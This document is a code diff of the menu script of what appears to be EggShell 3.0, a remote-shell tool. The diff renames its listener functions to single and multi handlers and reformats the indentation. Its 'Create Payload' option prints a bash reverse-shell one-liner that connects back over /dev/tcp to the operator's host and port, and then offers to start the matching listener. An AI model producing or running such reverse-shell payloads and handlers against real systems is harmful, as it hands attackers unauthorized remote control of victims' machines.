@@ -36,7 +36,7 @@ banner_text = h.GREEN+"""
 """+h.WHITE+"\nVersion: 3.0\nCreated By Lucas Jackson (@neoneggplant)\n"+h.ENDC +\
 h.WHITE+"-"*40+"\n"+""" Menu:
     1): Start Server
-    2): Start Multi Server
+    2): Start MultiHandler
     3): Create Payload
     4): Exit
 """+h.WHITE+"-"*40 + "\n"+h.NES
@@ -57,45 +57,47 @@ help_text = h.RED+"""     |                            """+h.GREEN+"""          
 
 # Actions
 
-def start_server():
-	if not server.set_host_port():
-		return
-	server.single()
+def start_single_server():
+    if not server.set_host_port():
+        return
+    server.start_single_handler()
 
 
-def start_multi_server():
-	print "start multi server"
+def start_multi_handler():
+    if not server.set_host_port():
+        return
+    server.start_multi_handler()
 
 
 def prompt_run_server():
     if raw_input(h.NES+"Start Server? (Y/n): ") == "n":
         return
     else:
-        if raw_input(h.NES+"Multi Server? (y/N): ") == "y":
-            server.multiServer(host,port)
+        if raw_input(h.NES+"MultiHandler? (y/N): ") == "y":
+            server.multi_handler()
         else:
-            server.single()
+            server.single_handler()
 
 
 def create_payload():
-	if not server.set_host_port():
-		return
-	print h.COLOR_INFO+"bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"+h.ENDC
-	prompt_run_server()
+    if not server.set_host_port():
+        return
+    print h.COLOR_INFO+"bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"+h.ENDC
+    prompt_run_server()
 
 
 def exit_menu():
-	exit()
+    exit()
 
 
 def menu(err=""):
     h.clear()
     if err:
-    	print err
+        print err
     option = raw_input(banner_text)
     choose = {
-        "1" : start_server,
-        "2" : start_multi_server,
+        "1" : start_single_server,
+        "2" : start_multi_handler,
         "3" : create_payload,
         "4" : exit_menu
     }
@@ -104,15 +106,15 @@ def menu(err=""):
         menu()
     except KeyError:
       if option:
-      	menu("Oops: " + option + " is not an option")
+        menu("Oops: " + option + " is not an option")
       else:
         menu()
 
 
 if __name__ == "__main__":
-	try:
-		h.generate_keys()
-		menu()
-	except KeyboardInterrupt:
-		print "\nBye!"
-		exit()
+    try:
+        h.generate_keys()
+        menu()
+    except KeyboardInterrupt:
+        print "\nBye!"
+        exit()
